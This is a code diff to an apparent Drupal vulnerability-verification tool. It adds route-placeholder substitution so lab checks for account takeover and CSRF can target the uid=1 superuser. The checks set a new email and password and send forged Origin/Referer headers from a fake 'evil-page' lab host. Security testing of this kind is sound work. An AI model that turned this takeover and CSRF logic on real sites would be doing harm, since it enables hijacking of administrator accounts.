@@ -234,6 +234,22 @@ def _drupal_login(base_url: str, user: str, password: str, timeout: float = 15.0
     return s if logged_in else None
 
 
+def _substitute_path_param(endpoint: str, param_name: str, value: str) -> "tuple[str, bool]":
+    """Si `{param_name}` aparece LITERAL dentro de `endpoint` (la convencion de ruta de Symfony/
+    Drupal, p.ej. '/mymodule/update/{uid}'), lo sustituye por `value` y devuelve
+    (endpoint_sustituido, True) -- esto es lo que hace falta cuando el ID objetivo viene
+    enlazado como ARGUMENTO del metodo del controlador por el propio enrutador, no como un
+    parametro de query/body que el codigo lea con $request->get(). Si el placeholder no aparece
+    en el endpoint, lo devuelve sin tocar y (endpoint, False): el caller entonces sabe que debe
+    mandar `param_name` como parametro normal, igual que antes."""
+    if not param_name:
+        return endpoint, False
+    token = "{" + param_name + "}"
+    if token in endpoint:
+        return endpoint.replace(token, value), True
+    return endpoint, False
+
+
 def _check_prereqs(module_source_dir: str, slug: str) -> Optional[WpVerifyResult]:
     res = WpVerifyResult()
     if not _docker_daemon_ok():
@@ -381,8 +397,14 @@ def verify_drupal_account_takeover(
         admin_uid = "1"   # drush site:install SIEMPRE crea el primer usuario como uid=1
         m = (http_method or "POST").upper()
         payload = dict(params) if isinstance(params, dict) else {p: "" for p in (params or [])}
+        path_substituted = False
         if id_p:
-            payload[id_p] = admin_uid
+            endpoint, path_substituted = _substitute_path_param(endpoint, id_p, admin_uid)
+            if path_substituted:
+                step(f"'{id_p}' es un parametro de RUTA (viene de *.routing.yml, no de "
+                     f"$request->get()) -- sustituido directamente en la URL: {endpoint}")
+            else:
+                payload[id_p] = admin_uid
         new_email = f"takeover-{_token()}@binoracle-lab.invalid" if email_p else None
         new_pass = secrets.token_urlsafe(10) if pass_p else None
         if email_p:
@@ -1673,7 +1695,9 @@ def verify_drupal_csrf(
             payload[pass_p] = new_pass
         id_p = _pick_param(parameters, _ID_HINTS)
         if id_p:
-            payload[id_p] = "1"   # uid=1, el superusuario -- ver _bootstrap_drupal_lab
+            endpoint, path_substituted = _substitute_path_param(endpoint, id_p, "1")
+            if not path_substituted:
+                payload[id_p] = "1"   # uid=1, el superusuario -- ver _bootstrap_drupal_lab
 
         headers_base = {"Origin": "https://binoracle-csrf-lab.invalid",
                         "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
